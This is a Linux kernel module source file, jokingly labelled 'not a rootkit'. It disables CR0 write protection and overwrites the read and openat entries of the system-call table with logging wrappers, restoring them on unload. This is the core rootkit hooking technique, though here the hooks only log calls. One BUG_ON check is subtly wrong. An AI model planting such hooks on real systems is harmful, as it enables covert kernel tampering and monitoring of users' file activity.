#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

#define CR0_WRITE_UNLOCK(x) \
	do { \
		unsigned long __cr0; \
		preempt_disable(); \
		__cr0 = read_cr0() & (~X86_CR0_WP); \
		BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
		write_cr0(__cr0); \
		x; \
		__cr0 = read_cr0() | X86_CR0_WP; \
		BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
		write_cr0(__cr0); \
		preempt_enable(); \
	} while(0)


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

static unsigned long *sys_call_table;
static void* real_read;
static void* real_openat;
static void* real_syscall_functions[2];
static int sys_call_indices[] = {__NR_read, __NR_openat};
static void* totallyReal_syscallPtrs[2];

asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
	return ((typeof(sys_read)*)(real_syscall_functions[0]))(fd, buf, count);
}

asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
	pr_info("openAt called (mkdir?) path:%s\n", pathname);
	return ((typeof(sys_openat)*)(real_syscall_functions[1]))(dirfd, pathname, flags, mode);
}

/*asmlinkage int totallyReal_mkdir(const char __user *pathname, umode_t mode){
	pr_info("fakeMkdir called!");
	return oldNR(pathname, mode);
}
*/

int __init loadMod(void){
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
	if (sys_call_table == NULL){
		pr_info("sys_call_table not found using kallsyms\n");
		return -1;
	}

	pr_info("module loaded\n");
	pr_info("sys_call_table pointer is %p\n", sys_call_table);

	totallyReal_syscallPtrs[0] = (void *) &totallyReal_read;
	totallyReal_syscallPtrs[1] = (void *) &totallyReal_openat;

	//saves original read syscall, injects fake read syscall
	real_syscall_functions[0] = (void*) sys_call_table[sys_call_indices[0]];
	pr_info("original read stored as %p\n", real_syscall_functions[0]);
	CR0_WRITE_UNLOCK({
		sys_call_table[sys_call_indices[0]] = totallyReal_syscallPtrs[0];
	});
	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[sys_call_indices[0]]);

	//saves original open syscall, injects fake open syscall
	real_syscall_functions[1] = (void *)sys_call_table[__NR_openat];
	pr_info("original openat stored as %p\n", real_syscall_functions[1]);
	CR0_WRITE_UNLOCK({
		sys_call_table[sys_call_indices[1]] = (void *) totallyReal_syscallPtrs[1];
	});
	pr_info("sys_call_table injected with totallyReal_openat ptr:%p\n", (void *)sys_call_table[sys_call_indices[1]]);

	/*
	pr_info("old __NR_mkdir:%p", sys_call_table[__NR_mkdir]);
	oldNR = (void*)sys_call_table[__NR_mkdir];
	sys_call_table[__NR_mkdir] = &fakeMkdir;
	*/

	return 0;		
}

void __exit unloadMod(void){
	pr_info("notarootkit unloading\n");
	
	CR0_WRITE_UNLOCK({
		sys_call_table[__NR_read] = real_syscall_functions[0];
		sys_call_table[__NR_openat] = real_syscall_functions[1];
	});
	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);	
	pr_info("sys_call_table openat ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_openat]);
	pr_info("notarootkit unloaded\n");
	return;
}

module_init(loadMod);
module_exit(unloadMod);

